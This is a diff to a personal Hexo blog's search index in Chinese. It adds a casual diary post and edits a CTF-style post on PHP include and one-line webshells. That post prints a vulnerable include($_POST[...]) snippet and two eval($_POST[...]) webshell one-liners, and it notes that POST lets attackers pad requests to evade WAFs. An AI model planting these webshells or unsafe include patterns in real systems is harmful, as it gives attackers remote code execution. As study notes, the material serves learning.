@@ -4,6 +4,31 @@
   
   
   <entry>
+    <title>电子榨菜</title>
+    <link href="/2024/10/26/%E7%94%B5%E5%AD%90%E6%A6%A8%E8%8F%9C/"/>
+    <url>/2024/10/26/%E7%94%B5%E5%AD%90%E6%A6%A8%E8%8F%9C/</url>
+    
+    <content type="html"><![CDATA[<h1 id="电子榨菜"><a href="#电子榨菜" class="headerlink" title="电子榨菜"></a>电子榨菜</h1><h2 id="2024-10-26"><a href="#2024-10-26" class="headerlink" title="2024-10-26"></a>2024-10-26</h2><p>写写干了什么，现在好想玩星际啊，不想写东西了，直接开完，这个geekcode还会接我话好玩的，星际推荐玩星际酒馆，不过在写这个东西的时候突然发现，一个功能，就是vscode的自动换行功能直接搜就行好用的，会根据现在的页面大小自动换行，星际战役好贵啊250，早十年玩就好了，还会送的，要不要写写明天干什么呢。，加个评论，看看这些好玩吧<br><img src="https://gitee.com/fogpost/photo/raw/master/202410262318542.png" srcset="/img/loading.gif" lazyload></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>电子榨菜</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>电子榨菜</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>solidity</title>
     <link href="/2024/10/25/solidity/"/>
     <url>/2024/10/25/solidity/</url>
@@ -109,7 +134,7 @@
     <link href="/2024/10/09/php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
     <url>/2024/10/09/php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
     
-    <content type="html"><![CDATA[<p>了解一下php的include函数顺便了解一句话木马的各种形式</p><h2 id="include函数"><a href="#include函数" class="headerlink" title="include函数"></a>include函数</h2><p>在php中，include函数用于引入一个文件，如果引入的文件不存在，则会抛出一个警告，但程序会继续执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;test.php&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello world&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>如果test.php不存在，则会抛出一个警告，但程序会继续执行，输出hello world。<br>我们也可以在文件中定义动态的文件名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$NSS</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;NSS&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$NSS</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$NSS</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$NSS</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h2 id="木马举例"><a href="#木马举例" class="headerlink" title="木马举例"></a>木马举例</h2><?php @eval($_POST['cmd']); ?><?php @eval($_POST[1]); ?><p>,简析一下这两马效果是一样的，但是数字与字符串的区别在于是否需要增加引号<br>一句话木马通常使用 POST 请求而不是 GET，因为 POST 请求可以隐藏参数，避免在 URL 中暴露敏感数据，从而增加隐蔽性和安全性。</p>]]></content>
+    <content type="html"><![CDATA[<p>了解一下php的include函数顺便了解一句话木马的各种形式</p><h2 id="include函数"><a href="#include函数" class="headerlink" title="include函数"></a>include函数</h2><p>在php中，include函数用于引入一个文件，如果引入的文件不存在，则会抛出一个警告，但程序会继续执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;test.php&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello world&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>如果test.php不存在，则会抛出一个警告，但程序会继续执行，输出hello world。<br>我们也可以在文件中定义动态的文件名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$NSS</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;NSS&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$NSS</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$NSS</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$NSS</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h2 id="木马举例"><a href="#木马举例" class="headerlink" title="木马举例"></a>木马举例</h2><?php @eval($_POST['cmd']); ?><?php @eval($_POST[1]); ?><p>,简析一下这两马效果是一样的，但是数字与字符串的区别在于是否需要增加引号<br>一句话木马通常使用 POST 请求而不是 GET，因为 get传参有限制，在对某些waf进行垃圾数据填充时不方便，无法构造畸形的数据包</p>]]></content>
     
     
     <categories>
@@ -297,31 +322,6 @@
     <tags>
       
       <tag>unserialize</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>web2</title>
-    <link href="/2024/09/24/web2/"/>
-    <url>/2024/09/24/web2/</url>
-    
-    <content type="html"><![CDATA[]]></content>
-    
-    
-    <categories>
-      
-      <category>ctf</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>web</tag>
       
     </tags>
     
